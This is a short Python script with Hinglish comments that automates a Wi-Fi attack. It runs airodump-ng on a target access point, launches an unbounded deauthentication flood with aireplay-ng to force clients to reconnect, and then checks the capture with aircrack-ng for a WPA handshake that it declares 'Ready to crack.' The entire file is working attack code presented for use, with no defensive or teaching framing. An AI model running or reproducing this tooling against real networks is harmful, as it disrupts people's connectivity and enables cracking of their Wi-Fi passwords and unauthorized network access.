import subprocess
import os
import time

def launch_attack(bssid, channel, interface='wlan0mon'):
    try:
        # Channel ko clean karo (agar ,11 wala aaye toh sirf 1 le lo)
        clean_channel = str(channel).split(',')[0]
        
        # 1. Safai (Cleanup): Pehle koi chalta hua airodump ya aireplay kill karo
        subprocess.run(['pkill', 'airodump-ng'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(['pkill', 'aireplay-ng'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(2)

        capture_file = "/tmp/awb_attack"
        
        # Purani files delete karo
        for ext in ["-01.cap", "-01.csv", "-01.kismet.csv", "-01.netxml"]:
            if os.path.exists(capture_file + ext):
                try:
                    os.remove(capture_file + ext)
                except:
                    pass
            
        # 2. airodump-ng start karo
        airodump = subprocess.Popen(['airodump-ng', '-c', clean_channel, '--bssid', bssid, '-w', capture_file, '--ignore-negative-one', interface], 
                                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        time.sleep(5) # airodump ko channel set hone do
        
        # 3. Infinite Deauth Attack (-0 0) background mein start karo
        aireplay = subprocess.Popen(['aireplay-ng', '-0', '0', '-a', bssid, '--ignore-negative-one', interface], 
                                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        # 60 seconds tak capture hone do
        time.sleep(60)
        
        # Dono processes ko band karo
        aireplay.terminate()
        airodump.terminate()
        airodump.wait()
        time.sleep(3) # File save hone do
        
        cap_file_path = capture_file + "-01.cap"
        if not os.path.exists(cap_file_path):
            return {"status": "error", "message": "Attack failed. airodump-ng could not start. Check terminal manually."}
        
        # 4. Handshake Verify Karna
        verify = subprocess.run(['aircrack-ng', cap_file_path], capture_output=True, text=True)
        output = verify.stdout
        
        if "1 handshake" in output:
            return {"status": "success", "message": "VERIFIED! Handshake captured successfully! Ready to crack.", "cap_file": cap_file_path}
        else:
            return {"status": "error", "message": "Attack finished but NO HANDSHAKE captured. Try again when target is using internet.", "cap_file": cap_file_path}
            
    except Exception as e:
        return {"status": "error", "message": str(e)}